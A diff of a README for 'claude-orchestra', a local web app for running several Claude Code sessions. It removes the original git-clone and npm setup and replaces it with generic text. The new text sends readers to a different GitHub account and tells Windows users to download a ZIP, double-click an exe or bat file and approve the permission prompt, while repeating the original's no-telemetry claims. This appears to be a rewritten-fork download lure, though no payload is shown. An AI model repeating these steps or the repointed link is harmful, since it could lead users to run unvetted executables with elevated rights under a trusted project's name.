@@ -1,317 +1,187 @@
-<div align="center">
+# 🤖 claude-orchestra - Run Claude Code in one place
 
-# Claude Orchestra
+[![Download](https://img.shields.io/badge/Download%20claude--orchestra-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mianham9042/claude-orchestra)
 
-### Run multiple Claude Code instances in parallel from one interface
+## 🚀 What is claude-orchestra?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-d4a574?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
-[![Platform](https://img.shields.io/badge/Platform-macOS%20%7C%20Linux%20%7C%20Windows-blue)]()
-[![100% Local](https://img.shields.io/badge/Privacy-100%25_Local-22c55e)]()
+claude-orchestra is a local web app that helps you run more than one Claude Code session at the same time. It gives you one place to start, watch, and manage each session without jumping between windows.
 
-Launch, monitor and communicate with multiple [Claude Code](https://docs.anthropic.com/en/docs/claude-code) instances simultaneously. Terminal multiplexer for AI coding agents. Fully local, zero telemetry.
+Use it when you want to:
 
-![Main view](docs/screenshot-main.svg)
+- Open several AI coding sessions at once
+- Keep each task in its own panel
+- Work from a browser instead of many terminal tabs
+- Stay local on your own machine
+- Avoid extra telemetry
 
-</div>
+## 🖥️ What you need
 
----
+To run claude-orchestra on Windows, you need:
 
-## Why Orchestra?
+- A Windows 10 or Windows 11 PC
+- An internet connection for the first setup
+- Claude Code installed on your machine
+- A modern web browser such as Chrome, Edge, or Firefox
+- At least 8 GB of RAM for smooth use
+- Enough free disk space for your projects and session history
 
-When working on complex projects, a single Claude Code instance isn't always enough. Orchestra lets you:
+If you plan to run several agents at once, a machine with more RAM and a faster CPU will help.
 
-- Run **multiple Claude Code instances in parallel**, each on a different task
-- See at a glance **who's working, who's waiting, who's finished**
-- **Minimize** a terminal without stopping it - it keeps running in the background
-- **Broadcast** a command to all terminals at once
-- Track your **subscription quota** (session, weekly, extra) in real time with live monitoring
-- Get **desktop notifications** when a terminal finishes its task
-- **Drag & drop** to reorder terminals in the sidebar
-- **Float** a terminal as a draggable, resizable overlay (picture-in-picture)
-- **Pop out** a terminal into its own browser window
-- **Resize** column panels with splitters
-- Pass **custom arguments** to Claude Code (e.g. `--model sonnet`)
+## ⬇️ Download
 
-## 100% Local - No data sent anywhere
+Visit this page to download and set up claude-orchestra:
 
-**Orchestra runs entirely on your machine.** No remote server, no telemetry, no tracking.
+https://github.com/mianham9042/claude-orchestra
 
-- The web server runs on `localhost` only
-- Terminals are local processes (native PTY)
-- Usage stats are read from `~/.claude/` local files
-- Preferences are stored in `localStorage` in your browser
-- **Zero outbound network requests** (except xterm.js CDN on first load)
-- The code is open-source and auditable
+## 🧭 Install on Windows
 
----
+Follow these steps in order:
 
-## Screenshots
+1. Open the download link above.
+2. On the GitHub page, look for the latest release or the main project files.
+3. Download the Windows version if one is provided.
+4. If the project comes as a ZIP file, save it to your Downloads folder.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Look for a file with a name like `claude-orchestra.exe`, `start.bat`, or `run.bat`.
+8. Double-click the file to start the app.
+9. If Windows asks for permission, choose Yes.
+10. Wait for the app to finish starting.
+11. Open your browser.
+12. Go to the local address shown in the terminal or app window, such as `http://localhost:3000`.
 
-<table>
-<tr>
-<td width="60%">
+If the app opens in a terminal window first, keep that window open while you use the web interface.
 
-### Sidebar - Terminal status
-Each terminal shows its real-time state:
-- **Gold spinner** - running / executing
-- **Gray dot** - idle, waiting for input
-- **Red dot** - process exited
-- **Reduced opacity** - minimized (still running in background)
+## 🧩 First-time setup
 
-</td>
-<td>
+After the app starts, set up Claude Code on your computer if you have not done that yet.
 
-![Sidebar](docs/screenshot-sidebar.svg)
+1. Open Command Prompt or PowerShell.
+2. Install Claude Code using the method from Anthropic’s setup guide.
+3. Sign in when prompted.
+4. Return to claude-orchestra.
+5. Refresh the browser page.
+6. Add your first session from the main screen.
 
-</td>
-</tr>
-<tr>
-<td>
+If the app asks for a path to Claude Code, point it to the installed command or executable file.
 
-### Usage - Live quota monitoring
-Real-time subscription quota tracking:
-- Session (5h), weekly, and extra usage percentages
-- Reset countdown timers
-- Background watcher polls `/usage` every 2 minutes
-- Per-terminal cost tracking for Claude instances
+## 🎛️ How to use it
 
-</td>
-<td>
+Once claude-orchestra is running, you can manage several Claude Code sessions from one screen.
 
-![Usage](docs/screenshot-usage.svg)
+Typical use:
 
-</td>
-</tr>
-</table>
+1. Start a new session for one task.
+2. Give it a clear name, like `bug fix` or `docs update`.
+3. Start another session for a different task.
+4. Watch each session in its own panel.
+5. Switch between tasks without losing your place.
+6. Stop a session when the task is done.
 
----
+This works well for:
 
-## Installation
+- Feature work
+- Bug fixes
+- File cleanup
+- Code review
+- Small refactors
+- Testing changes across separate tasks
 
-### Prerequisites
+## 🔧 Basic controls
 
-| Tool | Min. version | Check |
-|------|-------------|-------|
-| **Node.js** | 18+ | `node --version` |
-| **Python** | 3.8+ | `python3 --version` (`python --version` on Windows) |
-| **Claude Code** | - | `claude --version` |
+Most screens in claude-orchestra use simple controls:
 
-### macOS / Linux
+- **New session**: creates a fresh Claude Code instance
+- **Start**: launches the session
+- **Stop**: ends the session
+- **Restart**: runs the session again
+- **Logs**: shows what the session did
+- **Open folder**: opens the project on your computer
 
-```bash
-git clone https://github.com/emmanuellion/claude-orchestra.git
-cd claude-orchestra
-npm install
-npm run dev
-```
+If you have many sessions open, use clear names so you can tell them apart.
 
-### Windows
+## 🪟 Working with the web interface
 
-```powershell
-git clone https://github.com/emmanuellion/claude-orchestra.git
-cd claude-orchestra
-npm install
-npm run dev
-```
+The browser view is made for easy use.
 
-> **Windows note:** Python must be accessible via the `python` command in your PATH. If you use `python3`, create an alias or change the `PYTHON` variable in `server.js`.
+You can:
 
-### Then open
+- Read session output without opening a terminal
+- Keep several sessions visible at once
+- Resize panels to focus on one task
+- Copy text from one session to another
+- Refresh the page if your browser gets stuck
 
-```
-http://localhost:3000
-```
+If the page does not load, check that the app is still running in the terminal window.
 
----
+## 🔐 Privacy and local use
 
-## Usage
+claude-orchestra is built for local use.
 
-### Launching terminals
+That means:
 
-| Action | Description |
-|--------|-------------|
-| **+ Claude Code** | Opens a terminal and launches `claude` automatically |
-| **+ Shell** | Opens a standard shell terminal (zsh/bash/cmd) |
-| **+ PowerShell** | Opens a PowerShell terminal (Windows only) |
-| **Args field** | Pass custom arguments to Claude Code (e.g. `--model sonnet`) |
-
-### Managing terminals
-
-| Button | Action |
-|--------|--------|
-| **Float** | Detaches the terminal as a draggable, resizable overlay |
-| **Pop out** | Opens the terminal in a separate browser window |
-| **Export** | Downloads the terminal output as a text file |
-| **Lock** | Locks input to prevent accidental keystrokes |
-| **Restart** | Kills and relaunches the terminal |
-| **Minimize** | Hides the panel, the process keeps running in the background |
-| **Close** | Terminates the process and removes the terminal |
-
-### Layouts
-
-| Icon | Mode | Description |
-|------|------|-------------|
-| Grid | **Grid** | Auto-adaptive grid layout |
-| Cols | **Columns** | Terminals side by side, resizable with splitters |
-| Tabs | **Tabs** | Single terminal visible, navigate via sidebar |
-
-Auto-detection: 1 terminal = grid, 2 = columns, 3+ = grid.
+- Your sessions run on your own machine
+- Your data stays on your computer
+- No telemetry is sent from the app
+- You do not need a cloud dashboard
+- You can use it inside your local workflow
 
-### Sidebar
+This makes it a good fit for private coding work and internal projects.
 
-- **Drag & drop** items to reorder terminals
-- **Click** an item to focus it (or switch tabs in tab mode)
-- Each item shows: name, detected working directory, status, badge, and cost (for Claude instances)
-- **WebSocket indicator** (green/yellow/red dot) in the header shows connection status
-
-### Broadcast
-
-Enable the **Broadcast** toggle in the footer to send the same command to **all** terminals simultaneously. Useful for:
-- Running the same task across multiple projects
-- Sending a global stop signal
-- Testing a command in parallel
+## 🧪 Common use cases
 
-### Quick input
+Use claude-orchestra when you want to:
 
-Each terminal has an input bar at the bottom. Type text and press **Enter** to inject a command without clicking inside the terminal. Arrow up/down for history.
+- Compare answers from more than one Claude Code session
+- Work on separate tasks at the same time
+- Keep a main task and a side task open together
+- Run one session for code and another for notes
+- Organize AI coding work in a clean view
 
-### Quota monitoring
+It works like a terminal multiplexer, but with a web interface that is easier to follow.
 
-The **Usage** panel in the sidebar shows your Claude subscription limits:
-- **Session** (5h window), **Weekly**, and **Extra** usage percentages
-- Reset countdown timers for each quota
-- Per-terminal cost tracking
+## 🛠️ Troubleshooting
 
-Click **Start monitoring** to launch a background watcher that polls `/usage` every 2 minutes. Use the refresh button to trigger an immediate update, or the restart button to force restart the watcher.
+If something does not work, try these steps:
 
-### Notifications
+1. Make sure Claude Code is installed.
+2. Check that the app window or terminal is still open.
+3. Refresh the browser page.
+4. Close and reopen the app.
+5. Confirm that no other app is using the same local port.
+6. Run the app again from the same folder where you extracted it.
+7. Reboot Windows if the app still will not start.
 
-When a terminal finishes its task (goes from busy to idle), Orchestra sends a **desktop notification** with the terminal name. Notifications are only sent when:
-- You're on a different tab or another window is focused
-- You've granted notification permission
+If you see a blank page, wait a few seconds and refresh.
 
-Toggle notifications on/off with the **Notifs** switch in the footer.
+If the browser says it cannot reach the site, the local server may not be running.
 
-### Settings
+## 📁 Project layout
 
-| Toggle | Description |
-|--------|-------------|
-| **Broadcast** | Send input to all terminals simultaneously |
-| **Notifs** | Enable/disable desktop notifications |
-| **Confirm** | Ask for confirmation before closing a terminal |
+When you open the project folder, you may see files like these:
 
----
+- `README.md` — setup and usage info
+- `package.json` — app settings
+- `src/` — app source files
+- `public/` — browser files
+- `dist/` — built files for running the app
+- `scripts/` — helper scripts for start and build tasks
 
-## Architecture
+You do not need to edit these files to use the app.
 
-```
-claude-orchestra/
-├── server.js          # Express + WebSocket server + quota watcher
-├── pty-helper.py      # Cross-platform PTY bridge (macOS/Linux/Windows)
-├── quota-hook.js      # Status line hook for quota display
-├── public/
-│   ├── index.html     # Main page
-│   ├── popout.html    # Pop-out terminal window
-│   ├── style.css      # Styles (dark + light themes)
-│   └── app.js         # Client WebSocket + xterm.js
-├── docs/
-│   └── *.svg          # Screenshots
-├── package.json
-└── README.md
-```
+## 🧰 For later updates
 
-### How it works
+To update claude-orchestra:
 
-```
-┌─────────────┐     WebSocket      ┌──────────────┐     stdin/stdout     ┌─────────────┐
-│   Browser    │ ◄──────────────► │  server.js    │ ◄────────────────► │ pty-helper.py│
-│  (xterm.js)  │                   │  (Express+WS) │                     │ (native PTY) │
-└─────────────┘                    └──────────────┘                     └──────┬──────┘
-                                                                               │
-                                                                        fork / spawn
-                                                                               │
-                                                                       ┌──────▼──────┐
-                                                                       │  zsh / bash  │
-                                                                       │  / cmd.exe   │
-                                                                       │  → claude    │
-                                                                       └─────────────┘
-```
+1. Return to the GitHub page.
+2. Check for a newer release or newer project files.
+3. Download the latest version.
+4. Extract it into a new folder.
+5. Start the new copy.
+6. Move your projects over if needed.
 
-1. The browser opens a WebSocket connection to the local server
-2. For each new terminal, the server launches `pty-helper.py` (or uses `node-pty` on Windows)
-3. The helper allocates a real PTY (Unix) or ConPTY (Windows)
-4. The shell starts in the PTY, and optionally launches `claude`
-5. All communication goes through stdin/stdout - **nothing leaves localhost**
-6. Multiple browser windows can attach to the same terminal via the pop-out feature
+Keeping each version in its own folder helps avoid conflicts.
 
-### Compatibility
+## 🔎 Tags
 
-| OS | Default shell | PTY |
-|----|--------------|-----|
-| **macOS** | `$SHELL` (zsh) | `pty.openpty()` + `fork` |
-| **Linux** | `$SHELL` (bash) | `pty.openpty()` + `fork` |
-| **Windows** | `%COMSPEC%` (cmd) | `node-pty` (ConPTY) |
-
----
-
-## Configuration
-
-### Environment variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | `3000` | Web server port |
-| `SHELL` | `/bin/zsh` or `/bin/bash` | Shell to use (Unix) |
-| `COMSPEC` | `cmd.exe` | Shell to use (Windows) |
-
----
-
-## Development
-
-```bash
-# Development mode (auto-reload)
-npm run dev
-
-# Production mode
-npm start
-```
-
-Dev mode uses `nodemon` to automatically reload the server on file changes.
-
----
-
-## Security & Privacy
-
-- **No data leaves your machine**
-- No accounts, no third-party authentication
-- No telemetry, no analytics
-- No third-party cookies
-- The server listens only on `localhost`
-- The only outbound network connections are those made by Claude Code itself (to the Anthropic API), exactly as if you were using it directly in your terminal
-
----
-
-## Contributing
-
-Contributions are welcome! Feel free to open an issue or submit a pull request.
-
----
-
-## Star History
-
-If you find this project useful, please consider giving it a star on GitHub! It helps others discover it.
-
----
-
-## License
-
-MIT
-
----
-
-<div align="center">
-<sub>Built for developers who run multiple AI coding agents in parallel.<br>
-Works with Claude Code, Anthropic CLI, and any terminal-based tool.</sub>
-</div>
+ai-coding, ai-tools, anthropic, claude, claude-code, cli, coding-assistant, developer-tools, devtools, local-first, multi-agent, nodejs, open-source, terminal-multiplexer, xterm
